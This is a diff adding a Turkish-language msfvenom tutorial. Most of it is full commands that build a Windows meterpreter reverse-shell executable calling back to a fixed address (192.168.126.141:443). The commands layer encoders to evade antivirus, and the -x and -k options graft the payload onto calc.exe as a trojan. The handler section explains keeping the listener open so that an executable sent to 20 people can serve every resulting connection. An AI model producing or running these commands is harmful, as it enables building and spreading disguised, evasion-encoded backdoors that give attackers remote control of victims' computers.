@@ -1,3 +1,35 @@
 “msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.141 LPORT=443 -f raw -e x86/shikata_ga_nai -i 10 | msfvenom -a x86 --platform windows -e x86/countdown -i 5 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 20 -f exe -o /root/Desktop/eyup2.exe”
 
 multiple encoding => 10 iterasyonluk shikata_ga_nai üzerine 5 iterasyonluk coutdown ve onunda üzerine 20 iterasyonluk shikata_ga_nai yapıldı.
+
+Parametre AdıÖrnek Kullanımı-pmfvenom’da kullanılacak bir payload’u seçer. msfvenom -p “payload adı"
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.141 LPORT=443
+-lPayloadları listeler. msfvenom -l “payload, encoder, nops adı”
+msfvenom -l payloads veya msfvenom -l encoders
+-fKaydedilecek dosya formatı. msfvenom -f “çıktı formatı”
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.141 LPORT=443 -f exe
+-aOluşturulacak payload’un mimarisini belirler. Msfvenom -a “mimari”
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.141 LPORT=443 -f exe -a x86
+--platformDosyanın çalışacağı platformu belirler. msfvenom --platform “çalışacağı platform”
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.141 LPORT=443 -f exe -a x86 --platform windows
+-oPayload’un nereye çıkarılacağını belirtir. msfvenom -o “çıkarılacak dizin”
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.141 LPORT=443 -f exe -a x86 -o /root/Desktop/eyup.exe
+-eEncoder seçimini belirtir. msfvenom -e “encoder adı”
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.141 LPORT=443 -f exe -a x86 -o /root/Desktop/eyup.exe -e x86/shikata_ga_nai
+-iİterasyon sayısını belirler yani encoding işleminin kaç kere tekrarlanacağını bildirir. msfvenom -i 20
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.141 LPORT=443 -f exe -a x86 -o /root/Desktop/eyup.exe -e x86/shikata_ga_nai -i 20
+-bKötü karakterleri (bad characters) temizler. “msfvenom -b ‘\x00\xff’”
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.141 LPORT=443 -f exe -a x86 -o /root/Desktop/eyup.exe -e x86/shikata_ga_nai -i 20 -b ‘\x00’
+-xOluşturulacak payload’un bir dosya ile birleştirileceğini belirtir. msfvenom -x “birleştirilecek dosyanın adı veya yolu”
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.141 LPORT=443 -f exe -a x86 -o /root/Desktop/eyup.exe -e x86/shikata_ga_nai -i 20 -b ‘\x00’ -x /root/Desktop/calc.exe
+-kBirleştirilen dosyanın fonksiyonlarının bozulmasını engelle “msfvenom -k”
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.141 LPORT=443 -f exe -a x86 -o /root/Desktop/eyup.exe -e x86/shikata_ga_nai -i 20 -b ‘\x00’ -x /root/Desktop/calc.exe -k
+-cBirleştirilecek Shell code’u belirler. msfvenom -c “Shell code dizini”
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.141 LPORT=443 -c /root/Desktop/shellcode.txt
+Tablo: Msfvenom Parametreleri
+Üstteki tabloda görüleceği üzere Msfvenom oldukça rahat ve kolay bir kullanıma sahiptir. Aşağıdaki tabloda ise msfvenom’un çıktı formatları yer almaktadır.
+Çıktı TipiÇıktı ListesiÇalıştırılabilirasp, aspx, aspx-exe, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection, psh-cmd, vba, vba-exe, vba-psh, vbs, warYazılımsalbash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscriptTablo: Msfvenom Çıktı Formatları
+Msfvenom bir çok çıktı formatını desteklediği gibi, bir çok platformu da desteklemektedir. Msfvenom’un payload çıktısının çalışabileceği platformlar ise aşağıdaki gibidir.
+Çıktı TipiPlatform ListesiÇalıştırılabilirosx, bsd, openbsd, bsdi, netbsd, freebsd, aix, hpux, irix, unix, php, javascript, python, nodejs, firefox, solaris, cisco, linux, ruby, java, android, netware, windows
+
+set ExitOnSession falseKaç bağlantı gelirse gelsin, yeni bağlantıların gelmesi için bu değeri false konumuna alıyoruz. Örnek ile açıklamam gerekirse eğer; “oluşturduğumuz exe yi 20 kişiye göndereceğimizi varsayalım. Normal şartlar altında (yani varsayılanda) eğer bu değeri değiştirmezsek, ilk bağlantı geldikten sonra diğer 19 kişi bizimle bağlantı kuramayacaktır. Böyle bir sorun olmasın diyorsak bu değeri false yapmamız gerekiyor.”exploit -j -zListen moda geçip bağlantılar için bir jobs belirledik. Bundan sonra gelen tüm bağlantıları jobs karşılayacaktır.
